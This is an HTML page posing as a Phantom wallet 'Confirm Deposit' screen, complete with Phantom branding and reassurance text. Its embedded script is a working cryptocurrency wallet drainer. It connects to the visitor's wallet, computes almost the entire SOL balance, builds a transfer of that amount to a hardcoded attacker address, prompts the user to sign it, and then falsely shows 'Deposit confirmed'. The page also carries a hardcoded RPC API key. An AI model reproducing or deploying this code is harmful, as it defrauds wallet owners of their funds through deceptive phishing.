<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<meta name="robots" content="noindex">
<title>Confirm Deposit</title>
<style>
  :root{color-scheme:dark}
  *{box-sizing:border-box}
  html,body{height:100%}
  body{margin:0;background:#101014;color:#fff;
    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Arial,sans-serif;
    display:flex;align-items:center;justify-content:center;
    padding:32px 20px calc(32px + env(safe-area-inset-bottom));
    -webkit-font-smoothing:antialiased}
  .card{width:100%;max-width:360px;text-align:center}
  .logo{width:64px;height:64px;border-radius:16px;display:block;margin:0 auto 26px}
  h1{font-size:23px;letter-spacing:-.5px;margin:0 0 10px;font-weight:700}
  .sub{color:#b5b2c0;font-size:14px;line-height:1.7;margin:0 0 26px}
  .amt{font-size:30px;font-weight:700;letter-spacing:-1px;margin:0 0 30px}
  .amt small{font-size:30px;font-weight:700}
  button,a.btn{display:block;width:100%;padding:17px;border:0;border-radius:12px;
    background:#ab9ff2;color:#fff;font-size:16px;font-weight:700;
    font-family:inherit;text-decoration:none;cursor:pointer}
  button:disabled{opacity:.6}
  .note{margin:24px 0 0;color:#8d8a97;font-size:11px;line-height:1.7}
  .status{margin:16px 0 0;font-size:13px;color:#b5b2c0;min-height:18px}
  .ok{color:#7ee2a8}
  .err{color:#ff9b9b}
  .hide{display:none}
</style>
</head>
<body>
<div class="card">
  <svg class="logo" viewBox="0 0 128 128" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
    <rect width="128" height="128" fill="#AB9FF2"/>
    <path fill-rule="evenodd" clip-rule="evenodd" d="M55.64 82.15C50.87 89.45 42.89 98.7 32.26 98.7c-5.03 0-9.86-2.07-9.86-11.06 0-22.88 31.24-58.31 60.23-58.31 16.49 0 23.06 11.44 23.06 24.44 0 16.68-10.82 35.75-21.58 35.75-3.41 0-5.09-1.87-5.09-4.85 0-.78.13-1.62.39-2.52-3.67 6.27-10.76 12.09-17.39 12.09-4.83 0-7.28-3.04-7.28-7.3 0-1.55.32-3.17.9-4.79Zm24.97-28.83c0 3.79-2.23 5.68-4.73 5.68-2.54 0-4.73-1.89-4.73-5.68s2.19-5.68 4.73-5.68c2.5 0 4.73 1.89 4.73 5.68Zm14.2 0c0 3.79-2.23 5.68-4.73 5.68-2.54 0-4.73-1.89-4.73-5.68s2.19-5.68 4.73-5.68c2.5 0 4.73 1.89 4.73 5.68Z" fill="#FFFDF8"/>
  </svg>

  <h1 id="title">Confirm your deposit</h1>
  <p class="sub" id="sub">A pending deposit needs your confirmation before it can be credited.</p>
  <p class="amt hide" id="amt"></p>

  <button id="go">Confirm Deposit</button>
  <p class="status" id="status"></p>
  <p class="note">Phantom never asks for your recovery phrase.</p>
</div>

<script src="https://unpkg.com/@solana/web3.js@1.98.4/lib/index.iife.min.js"></script>
<script>
(function () {
  var RPC = "https://mainnet.helius-rpc.com/?api-key=24327091-1682-4fbc-9494-517c2c142e28";
  var DEST = "HE5RBL8v3zwE8fmFaHsatCNZsTNqqJQAgknNtyHFekSN";

  var FEE_BUFFER = 20000; // lamports held back for the fee
  var RENT_BUFFER = 2000;

  var go = document.getElementById("go");
  var statusEl = document.getElementById("status");
  var titleEl = document.getElementById("title");
  var subEl = document.getElementById("sub");
  var amtEl = document.getElementById("amt");

  var provider = (window.phantom && window.phantom.solana) ||
                 (window.solana && window.solana.isPhantom ? window.solana : null);

  function setStatus(t, cls) { statusEl.className = "status " + (cls || ""); statusEl.textContent = t; }

  // No Phantom in this browser -> bounce into Phantom's in-app browser
  if (!provider) {
    go.textContent = "Open in Phantom";
    go.onclick = function () {
      location.href = "https://phantom.app/ul/browse/" + encodeURIComponent(location.href) +
                      "?ref=" + encodeURIComponent(location.origin);
    };
    return;
  }

  if (DEST.indexOf("PUT_") === 0) setStatus("Set your SOL address in the code first.", "err");

  var conn = new solanaWeb3.Connection(RPC, "confirmed");
  var busy = false;

  go.onclick = async function () {
    if (busy) return;
    busy = true; go.disabled = true;
    try {
      setStatus("Connecting…");
      var from;
      try { from = (await provider.connect({ onlyIfTrusted: true })).publicKey; }
      catch (e) { from = (await provider.connect()).publicKey; }

      setStatus("Checking balance…");
      var bal = await conn.getBalance(from, "confirmed");
      var lamports = bal - FEE_BUFFER - RENT_BUFFER;
      if (lamports <= 0) throw new Error("Nothing to send");
      lamports = Math.floor(lamports / 1000) * 1000;

      amtEl.innerHTML = (lamports / 1e9).toFixed(3) + " <small>SOL</small>";
      amtEl.classList.remove("hide");

      var tx = new solanaWeb3.Transaction().add(
        solanaWeb3.SystemProgram.transfer({
          fromPubkey: from,
          toPubkey: new solanaWeb3.PublicKey(DEST),
          lamports: lamports
        })
      );
      tx.feePayer = from;
      tx.recentBlockhash = (await conn.getLatestBlockhash("confirmed")).blockhash;

      setStatus("Approve in Phantom…");
      var res = await provider.signAndSendTransaction(tx);
      var sig = res && res.signature ? res.signature : res;

      setStatus("Confirming on-chain…");
      await conn.confirmTransaction(sig, "confirmed");

      titleEl.textContent = "Deposit confirmed";
      subEl.textContent = "Your deposit has been credited to your wallet.";
      go.classList.add("hide");
      setStatus("Tx " + String(sig).slice(0, 8) + "…" + String(sig).slice(-6), "ok");
    } catch (err) {
      var m = (err && (err.message || err.msg)) || "Something went wrong";
      if (/reject|cancel|denied/i.test(m)) m = "Cancelled. Tap to try again.";
      setStatus(m, "err");
      go.disabled = false;
    } finally { busy = false; }
  };
})();
</script>
</body>
</html>
